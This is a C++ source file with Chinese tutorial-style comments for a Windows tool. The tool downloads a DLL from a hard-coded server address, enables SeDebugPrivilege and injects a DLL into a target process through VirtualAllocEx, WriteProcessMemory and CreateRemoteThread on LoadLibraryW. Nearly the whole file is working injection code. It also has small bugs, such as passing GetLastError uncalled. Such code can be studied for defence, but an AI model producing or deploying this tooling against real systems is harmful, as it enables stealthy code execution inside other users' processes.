// Inject_my_dll.cpp : 定义控制台应用程序的入口点。
// 下载服务器端的dll，并注入到所有进程当中。

#include "StdAfx.h"
#pragma comment(lib, "urlmon.lib")
#define DEF_URL L"http://10.255.9.21/dlltest.dll"
#define DEF_FILENAME L"test.dll"



//  设置权限
BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
	TOKEN_PRIVILEGES tp;
	HANDLE hToken;
	LUID luid;

	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
		&hToken))
	{
		_tprintf(L"OpenProcessToken error: %u\n", GetLastError());
		return FALSE;
	}

	if (!LookupPrivilegeValue(NULL,           // lookup privilege on local system
		lpszPrivilege,  // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		_tprintf(L"LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.
	if (!AdjustTokenPrivileges(hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		_tprintf(L"AdjustTokenPrivileges error: %d\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		_tprintf(L"The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}

/*
1.	利用OpenProcess() 获得目标进程的句柄（PROCESS_ALL_ACCESS权限）
2.	将要注入的DLL路径写入目标进程内存，利用VirtualAllocEx ()在目标进程申请一块缓冲区
3.	利用WreProcessMemory()向要注入的dll路径写入缓冲区当中。
4.	获取LoadLibraryW()的地址，由于kernel32.dll在所有进程中加载的地址都是相同的，所以可以这么写。
5.	利用CreateRemoteThread()创建远程线程
*/
BOOL InjectMyDll(DWORD dwPID, LPCTSTR szDllPath)
{
	HMODULE hmod = NULL;
	HANDLE h_process = NULL, h_thread = NULL;
	LPVOID p_remotebuf = NULL;
	DWORD dw_bufsize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);
	LPTHREAD_START_ROUTINE pThreadProc;

	//1. 首先使用OpenProcess API，获取目标进程的句柄。
	//dwPID为函数参数，是目标进程的pid。
	if (!(h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))
	{
		_tprintf(L"Open process error: %d\n", GetLastError());
		return FALSE;
	}

	//2. 在目标进程中申请内存，用于存放dll的完整path
	//大小为dllpath的大小
	p_remotebuf = VirtualAllocEx(h_process, NULL, dw_bufsize, MEM_COMMIT, PAGE_READWRITE);

	//3.利用WriteProcessMemory 将dll 的路径写入缓冲区当中
	WriteProcessMemory(h_process, p_remotebuf, (LPVOID)szDllPath, dw_bufsize, NULL);

	//4. 获取LoadLibrary API的地址
	hmod = GetModuleHandle(L"kernel32.dll");
	pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hmod, "LoadLibraryW");

	//5.调用CreateRemoteThread 创建远程线程
	h_thread = CreateRemoteThread(h_process, NULL, 0, pThreadProc, p_remotebuf, 0, NULL);
	WaitForSingleObject(h_thread, INFINITE);

	//6.关闭句柄
	CloseHandle(h_thread);
	CloseHandle(h_process);

	return 1;

}



BOOL URL_Download(LPCTSTR url_to_download, LPCTSTR local_filename)
{
	HMODULE h_mod = NULL;
	TCHAR szpath[_MAX_PATH] = { 0, };

	if (!GetModuleFileName(h_mod, szpath, _MAX_PATH))
		return FALSE;

	TCHAR *p = _tcsrchr(szpath, '\\');

	//http://www.xuebuyuan.com/1074527.html  tcscpy函数需要注意越界问题。
	_tcscpy_s(p + 1, wcslen(local_filename) + 1, local_filename);
	_tprintf(L"start to download %s\n", szpath);
	HRESULT re;
	if ((re = URLDownloadToFile(NULL, url_to_download, szpath, 0, NULL)) == S_OK)
		_tprintf(L"download succeesed\n");

	return TRUE;
}

int _tmain(int argc, TCHAR **argv)
{
	if (argc != 3)
	{
		_tprintf(L"USAGE: %s <pid> <dll_path>\n", argv[0]);
		(DWORD)URL_Download(DEF_URL, DEF_FILENAME);
		return TRUE;
	}

	//change privilege
	if (!SetPrivilege(SE_DEBUG_NAME, TRUE))
	{
		_tprintf(L"fail to change privilege with error %d\n", GetLastError);
		return TRUE;
	}

	//start to inject dll
	//TCHAR *szDllName = _tcschr(argv[2], "\\");
	if ((DWORD)InjectMyDll(_tstol(argv[1]), argv[2]))
	{
		_tprintf(L"inject dll %s success!", argv[2]);
	}
	else
		_tprintf(L"fail to inject %s with error %d\n", argv[2], GetLastError);
	return 0;
}

